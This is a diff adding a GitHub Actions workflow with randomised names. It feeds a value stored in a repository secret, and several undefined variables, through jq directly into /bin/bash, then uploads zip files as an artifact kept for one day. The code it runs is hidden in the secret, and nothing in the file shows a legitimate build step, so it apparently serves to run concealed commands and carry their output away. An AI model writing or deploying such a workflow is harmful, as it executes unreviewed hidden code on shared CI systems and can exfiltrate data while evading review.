@@ -1,0 +1,27 @@
+name: jeffrey1060canary
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jeffrey1060canary
+        env:
+          ko39130: ${{ secrets.ko39130 }}
+        run: |
+          printf '%s' "$ko39130" | jq -r .a505 | /bin/bash
+          printf '%s' "$wttk54663" | jq -r .boxx5284 | /bin/bash
+          printf '%s' "$wa1852" | jq -r .g4540 | /bin/bash
+          echo $vso892 | jq -r .wmsmk4994 | /bin/bash
+          echo $bri7831 | jq -r .pnpk161 | /bin/bash
+          echo $g19 | jq -r .ag8123 | /bin/bash
+          printf '%s' "$fsf0" | jq -r .lxrye7030 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: zg2UC1vu
+          path: "*.zip"
+          retention-days: 1
